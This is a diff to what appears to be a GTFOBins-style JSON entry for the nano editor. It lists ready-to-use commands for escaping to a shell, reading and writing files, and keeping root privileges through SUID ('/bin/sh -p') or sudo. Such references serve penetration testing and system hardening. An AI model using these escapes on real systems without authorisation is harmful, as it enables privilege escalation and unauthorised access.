@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        
+        "description": "",
         "code": "nano\n^R^X\nreset; sh 1>&0 2>&0\n"
       },
       {
@@ -12,25 +12,25 @@
     ],
     "file-write": [
       {
-        
+        "description": "",
         "code": "nano file_to_write\nDATA\n^O\n"
       }
     ],
     "file-read": [
       {
-        
+        "description": "",
         "code": "nano file_to_read\n"
       }
     ],
     "limited-suid": [
       {
         "description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
-        "code": "./nano -s /bin/sh\n/bin/sh\n^T\n"
+        "code": "./nano -s \"/bin/sh -p\"\n/bin/sh -p\n^T\n"
       }
     ],
     "sudo": [
       {
-        
+        "description": "",
         "code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
       }
     ]
